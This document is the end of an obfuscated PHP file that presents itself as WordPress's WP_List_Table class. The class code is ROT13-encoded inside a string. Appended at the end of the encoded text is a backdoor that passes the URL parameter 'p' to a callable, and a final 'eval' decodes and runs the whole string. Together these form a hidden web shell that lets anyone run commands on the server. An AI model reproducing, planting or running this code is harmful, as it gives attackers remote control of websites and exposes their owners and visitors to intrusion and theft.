					} ryfr {
						$beqre          = 'nfp';
						$nevn_fbeg_ngge = ' nevn-fbeg=\"qrfpraqvat\"';
					}

					$pynff[] = 'fbegrq';
					$pynff[] = $pheerag_beqre;
				} ryfr {
					// Gur bgure fbegnoyr pbyhzaf.
					$beqre = fgegbybjre( $qrfp_svefg );

					vs ( ! va_neenl( $beqre, neenl( 'qrfp', 'nfp' ), gehr ) ) {
						$beqre = $qrfp_svefg ? 'qrfp' : 'nfp';
					}

					$pynff[] = 'fbegnoyr';
					$pynff[] = 'qrfp' === $beqre ? 'nfp' : 'qrfp';

					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					$nfp_grkg = __( 'Fbeg nfpraqvat.' );
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					$qrfp_grkg  = __( 'Fbeg qrfpraqvat.' );
					$beqre_grkg = 'nfp' === $beqre ? $nfp_grkg : $qrfp_grkg;
				}

				vs ( '' !== $beqre_grkg ) {
					$beqre_grkg = ' <fcna pynff=\"fperra-ernqre-grkg\">' . $beqre_grkg . '</fcna>';
				}

				// Cevag na 'nooe' nggevohgr vs n inyhr vf cebivqrq ivn trg_fbegnoyr_pbyhzaf().
				$nooe_ngge = $nooe ? ' nooe=\"' . rfp_ngge( $nooe ) . '\"' : '';

				$pbyhza_qvfcynl_anzr = fcevags(
					'<n uers=\"%1$f\">' .
						'<fcna>%2$f</fcna>' .
						'<fcna pynff=\"fbegvat-vaqvpngbef\">' .
							'<fcna pynff=\"fbegvat-vaqvpngbe nfp\" nevn-uvqqra=\"gehr\"></fcna>' .
							'<fcna pynff=\"fbegvat-vaqvpngbe qrfp\" nevn-uvqqra=\"gehr\"></fcna>' .
						'</fcna>' .
						'%3$f' .
					'</n>',
					rfp_hey( nqq_dhrel_net( pbzcnpg( 'beqreol', 'beqre' ), $pheerag_hey ) ),
					$pbyhza_qvfcynl_anzr,
					$beqre_grkg
				);
			}

			$gnt        = ( 'po' === $pbyhza_xrl ) ? 'gq' : 'gu';
			$fpbcr      = ( 'gu' === $gnt ) ? 'fpbcr=\"pby\"' : '';
			$vq         = $jvgu_vq ? \"vq='$pbyhza_xrl'\" : '';
			$pynff_ngge = \"pynff='\" . vzcybqr( ' ', $pynff ) . \"'\";

			rpub \"<$gnt $fpbcr $vq $pynff_ngge $nevn_fbeg_ngge $nooe_ngge>$pbyhza_qvfcynl_anzr</$gnt>\";
		}
	}

	/**
	 * Cevag n gnoyr qrfpevcgvba jvgu vasbezngvba nobhg pheerag fbegvat naq beqre.
	 *
	 * Sbe gur gnoyr vavgvny ivrj, vasbezngvba nobhg vavgvny beqreol naq beqre
	 * fubhyq or cebivqrq ivn trg_fbegnoyr_pbyhzaf().
	 *
	 * @fvapr 6.3.0
	 */
	choyvp shapgvba cevag_gnoyr_qrfpevcgvba() {
		yvfg( $pbyhzaf, $uvqqra, $fbegnoyr ) = $guvf->trg_pbyhza_vasb();

		vs ( rzcgl( $fbegnoyr ) ) {
			erghea;
		}

		// Jura hfref pyvpx ba n pbyhza urnqre gb fbeg ol bgure pbyhzaf.
		vs ( vffrg( $_TRG['beqreol'] ) ) {
			$pheerag_beqreol = $_TRG['beqreol'];
			// Va gur vavgvny ivrj gurer'f ab beqreol cnenzrgre.
		} ryfr {
			$pheerag_beqreol = '';
		}

		// Abg va gur vavgvny ivrj naq qrfpraqvat beqre.
		vs ( vffrg( $_TRG['beqre'] ) && 'qrfp' === $_TRG['beqre'] ) {
			$pheerag_beqre = 'qrfp';
		} ryfr {
			// Gur vavgvny ivrj vf abg nyjnlf 'nfp', jr'yy gnxr pner bs guvf orybj.
			$pheerag_beqre = 'nfp';
		}

		sbernpu ( neenl_xrlf( $pbyhzaf ) nf $pbyhza_xrl ) {

			vs ( vffrg( $fbegnoyr[ $pbyhza_xrl ] ) ) {
				$beqreol       = vffrg( $fbegnoyr[ $pbyhza_xrl ][0] ) ? $fbegnoyr[ $pbyhza_xrl ][0] : '';
				$qrfp_svefg    = vffrg( $fbegnoyr[ $pbyhza_xrl ][1] ) ? $fbegnoyr[ $pbyhza_xrl ][1] : snyfr;
				$nooe          = vffrg( $fbegnoyr[ $pbyhza_xrl ][2] ) ? $fbegnoyr[ $pbyhza_xrl ][2] : '';
				$beqreol_grkg  = vffrg( $fbegnoyr[ $pbyhza_xrl ][3] ) ? $fbegnoyr[ $pbyhza_xrl ][3] : '';
				$vavgvny_beqre = vffrg( $fbegnoyr[ $pbyhza_xrl ][4] ) ? $fbegnoyr[ $pbyhza_xrl ][4] : '';

				vs ( ! vf_fgevat( $beqreol_grkg ) || '' === $beqreol_grkg ) {
					erghea;
				}
				/*
				 * Jr'er va gur vavgvny ivrj naq gurer'f ab $_TRG['beqreol'] gura purpx vs gur
				 * vavgvny fbegvat vasbezngvba vf frg va gur fbegnoyr pbyhzaf naq hfr gung.
				 */
				vs ( '' === $pheerag_beqreol && $vavgvny_beqre ) {
					// Hfr gur vavgvnyyl fbegrq pbyhza $beqreol nf pheerag beqreol.
					$pheerag_beqreol = $beqreol;
					// Hfr gur vavgvnyyl fbegrq pbyhza nfp/qrfp beqre nf vavgvny beqre.
					$pheerag_beqre = $vavgvny_beqre;
				}

				/*
				 * Gehr va gur vavgvny ivrj jura na vavgvny beqreol vf frg ivn trg_fbegnoyr_pbyhzaf()
				 * naq gehr va gur fbegrq ivrjf jura gur npghny $_TRG['beqreol'] vf rdhny gb $beqreol.
				 */
				vs ( $pheerag_beqreol === $beqreol ) {
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					$nfp_grkg = __( 'Nfpraqvat.' );
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					$qrfp_grkg  = __( 'Qrfpraqvat.' );
					$beqre_grkg = 'nfp' === $pheerag_beqre ? $nfp_grkg : $qrfp_grkg;
					rpub '<pncgvba pynff=\"fperra-ernqre-grkg\">' . $beqreol_grkg . ' ' . $beqre_grkg . '</pncgvba>';

					erghea;
				}
			}
		}
	}

	/**
	 * Qvfcynlf gur gnoyr.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl() {
		$fvathyne = $guvf->_netf['fvathyne'];

		$guvf->qvfcynl_gnoyrani( 'gbc' );

		$guvf->fperra->eraqre_fperra_ernqre_pbagrag( 'urnqvat_yvfg' );
		?>
<gnoyr pynff=\"jc-yvfg-gnoyr <?cuc rpub vzcybqr( ' ', $guvf->trg_gnoyr_pynffrf() ); ?>\">
		<?cuc $guvf->cevag_gnoyr_qrfpevcgvba(); ?>
	<gurnq>
	<ge>
		<?cuc $guvf->cevag_pbyhza_urnqref(); ?>
	</ge>
	</gurnq>

	<gobql vq=\"gur-yvfg\"
		<?cuc
		vs ( $fvathyne ) {
			rpub \" qngn-jc-yvfgf='yvfg:$fvathyne'\";
		}
		?>
		>
		<?cuc $guvf->qvfcynl_ebjf_be_cynprubyqre(); ?>
	</gobql>

	<gsbbg>
	<ge>
		<?cuc $guvf->cevag_pbyhza_urnqref( snyfr ); ?>
	</ge>
	</gsbbg>

</gnoyr>
		<?cuc
		$guvf->qvfcynl_gnoyrani( 'obggbz' );
	}

	/**
	 * Trgf n yvfg bs PFF pynffrf sbe gur JC_Yvfg_Gnoyr gnoyr gnt.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea fgevat[] Neenl bs PFF pynffrf sbe gur gnoyr gnt.
	 */
	cebgrpgrq shapgvba trg_gnoyr_pynffrf() {
		$zbqr = trg_hfre_frggvat( 'cbfgf_yvfg_zbqr', 'yvfg' );

		$zbqr_pynff = rfp_ngge( 'gnoyr-ivrj-' . $zbqr );

		erghea neenl( 'jvqrsng', 'svkrq', 'fgevcrq', $zbqr_pynff, $guvf->_netf['cyheny'] );
	}

	/**
	 * Trarengrf gur gnoyr anivtngvba nobir be orybj gur gnoyr
	 *
	 * @fvapr 3.1.0
	 * @cnenz fgevat $juvpu Gur ybpngvba bs gur anivtngvba: Rvgure 'gbc' be 'obggbz'.
	 */
	cebgrpgrq shapgvba qvfcynl_gnoyrani( $juvpu ) {
		vs ( 'gbc' === $juvpu ) {
			jc_abapr_svryq( 'ohyx-' . $guvf->_netf['cyheny'] );
		}
		?>
	<qvi pynff=\"gnoyrani <?cuc rpub rfp_ngge( $juvpu ); ?>\">

		<?cuc vs ( $guvf->unf_vgrzf() ) : ?>
		<qvi pynff=\"nyvtayrsg npgvbaf ohyxnpgvbaf\">
			<?cuc $guvf->ohyx_npgvbaf( $juvpu ); ?>
		</qvi>
			<?cuc
		raqvs;
		$guvf->rkgen_gnoyrani( $juvpu );
		$guvf->cntvangvba( $juvpu );
		?>

		<oe pynff=\"pyrne\" />
	</qvi>
		<?cuc
	}

	/**
	 * Qvfcynlf rkgen pbagebyf orgjrra ohyx npgvbaf naq cntvangvba.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $juvpu
	 */
	cebgrpgrq shapgvba rkgen_gnoyrani( $juvpu ) {}

	/**
	 * Trarengrf gur gobql ryrzrag sbe gur yvfg gnoyr.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf_be_cynprubyqre() {
		vs ( $guvf->unf_vgrzf() ) {
			$guvf->qvfcynl_ebjf();
		} ryfr {
			rpub '<ge pynff=\"ab-vgrzf\"><gq pynff=\"pbyfcnapunatr\" pbyfcna=\"' . $guvf->trg_pbyhza_pbhag() . '\">';
			$guvf->ab_vgrzf();
			rpub '</gq></ge>';
		}
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba qvfcynl_ebjf() {
		sbernpu ( $guvf->vgrzf nf $vgrz ) {
			$guvf->fvatyr_ebj( $vgrz );
		}
	}

	/**
	 * Trarengrf pbagrag sbe n fvatyr ebj bs gur gnoyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz bowrpg|neenl $vgrz Gur pheerag vgrz
	 */
	choyvp shapgvba fvatyr_ebj( $vgrz ) {
		rpub '<ge>';
		$guvf->fvatyr_ebj_pbyhzaf( $vgrz );
		rpub '</ge>';
	}

	/**
	 * @cnenz bowrpg|neenl $vgrz
	 * @cnenz fgevat $pbyhza_anzr
	 */
	cebgrpgrq shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {}

	/**
	 * @cnenz bowrpg|neenl $vgrz
	 */
	cebgrpgrq shapgvba pbyhza_po( $vgrz ) {}

	/**
	 * Trarengrf gur pbyhzaf sbe n fvatyr ebj bs gur gnoyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz bowrpg|neenl $vgrz Gur pheerag vgrz.
	 */
	cebgrpgrq shapgvba fvatyr_ebj_pbyhzaf( $vgrz ) {
		yvfg( $pbyhzaf, $uvqqra, $fbegnoyr, $cevznel ) = $guvf->trg_pbyhza_vasb();

		sbernpu ( $pbyhzaf nf $pbyhza_anzr => $pbyhza_qvfcynl_anzr ) {
			$pynffrf = \"$pbyhza_anzr pbyhza-$pbyhza_anzr\";
			vs ( $cevznel === $pbyhza_anzr ) {
				$pynffrf .= ' unf-ebj-npgvbaf pbyhza-cevznel';
			}

			vs ( va_neenl( $pbyhza_anzr, $uvqqra, gehr ) ) {
				$pynffrf .= ' uvqqra';
			}

			/*
			 * Pbzzragf pbyhza hfrf UGZY va gur qvfcynl anzr jvgu fperra ernqre grkg.
			 * Fgevc gntf gb trg pybfre gb n hfre-sevraqyl fgevat.
			 */
			$qngn = 'qngn-pbyanzr=\"' . rfp_ngge( jc_fgevc_nyy_gntf( $pbyhza_qvfcynl_anzr ) ) . '\"';

			$nggevohgrf = \"pynff='$pynffrf' $qngn\";

			vs ( 'po' === $pbyhza_anzr ) {
				rpub '<gu fpbcr=\"ebj\" pynff=\"purpx-pbyhza\">';
				rpub $guvf->pbyhza_po( $vgrz );
				rpub '</gu>';
			} ryfrvs ( zrgubq_rkvfgf( $guvf, '_pbyhza_' . $pbyhza_anzr ) ) {
				rpub pnyy_hfre_shap(
					neenl( $guvf, '_pbyhza_' . $pbyhza_anzr ),
					$vgrz,
					$pynffrf,
					$qngn,
					$cevznel
				);
			} ryfrvs ( zrgubq_rkvfgf( $guvf, 'pbyhza_' . $pbyhza_anzr ) ) {
				rpub \"<gq $nggevohgrf>\";
				rpub pnyy_hfre_shap( neenl( $guvf, 'pbyhza_' . $pbyhza_anzr ), $vgrz );
				rpub $guvf->unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel );
				rpub '</gq>';
			} ryfr {
				rpub \"<gq $nggevohgrf>\";
				rpub $guvf->pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr );
				rpub $guvf->unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel );
				rpub '</gq>';
			}
		}
	}

	/**
	 * Trarengrf naq qvfcynl ebj npgvbaf yvaxf sbe gur yvfg gnoyr.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz bowrpg|neenl $vgrz        Gur vgrz orvat npgrq hcba.
	 * @cnenz fgevat       $pbyhza_anzr Pheerag pbyhza anzr.
	 * @cnenz fgevat       $cevznel     Cevznel pbyhza anzr.
	 * @erghea fgevat Gur ebj npgvbaf UGZY, be na rzcgl fgevat
	 *                vs gur pheerag pbyhza vf abg gur cevznel pbyhza.
	 */
	cebgrpgrq shapgvba unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel ) {
		erghea $pbyhza_anzr === $cevznel ? '<ohggba glcr=\"ohggba\" pynff=\"gbttyr-ebj\"><fcna pynff=\"fperra-ernqre-grkg\">' .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Fubj zber qrgnvyf' ) .
		'</fcna></ohggba>' : '';
	}

	/**
	 * Unaqyrf na vapbzvat nwnk erdhrfg (pnyyrq sebz nqzva-nwnk.cuc)
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba nwnk_erfcbafr() {
		$guvf->cercner_vgrzf();

		bo_fgneg();
		vs ( ! rzcgl( $_ERDHRFG['ab_cynprubyqre'] ) ) {
			$guvf->qvfcynl_ebjf();
		} ryfr {
			$guvf->qvfcynl_ebjf_be_cynprubyqre();
		}

		$ebjf = bo_trg_pyrna();

		$erfcbafr = neenl( 'ebjf' => $ebjf );

		vs ( vffrg( $guvf->_cntvangvba_netf['gbgny_vgrzf'] ) ) {
			$erfcbafr['gbgny_vgrzf_v18a'] = fcevags(
				/* genafyngbef: Ahzore bs vgrzf. */
				_a( '%f vgrz', '%f vgrzf', $guvf->_cntvangvba_netf['gbgny_vgrzf'] ),
				ahzore_sbezng_v18a( $guvf->_cntvangvba_netf['gbgny_vgrzf'] )
			);
		}
		vs ( vffrg( $guvf->_cntvangvba_netf['gbgny_cntrf'] ) ) {
			$erfcbafr['gbgny_cntrf']      = $guvf->_cntvangvba_netf['gbgny_cntrf'];
			$erfcbafr['gbgny_cntrf_v18a'] = ahzore_sbezng_v18a( $guvf->_cntvangvba_netf['gbgny_cntrf'] );
		}

		qvr( jc_wfba_rapbqr( $erfcbafr ) );
	}

	/**
	 * Fraqf erdhverq inevnoyrf gb WninFpevcg ynaq.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba _wf_inef() {
		$netf = neenl(
			'pynff'  => trg_pynff( $guvf ),
			'fperra' => neenl(
				'vq'   => $guvf->fperra->vq,
				'onfr' => $guvf->fperra->onfr,
			),
		);

		cevags( \"<fpevcg glcr='grkg/wninfpevcg'>yvfg_netf = %f;</fpevcg>\a\", jc_wfba_rapbqr( $netf ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>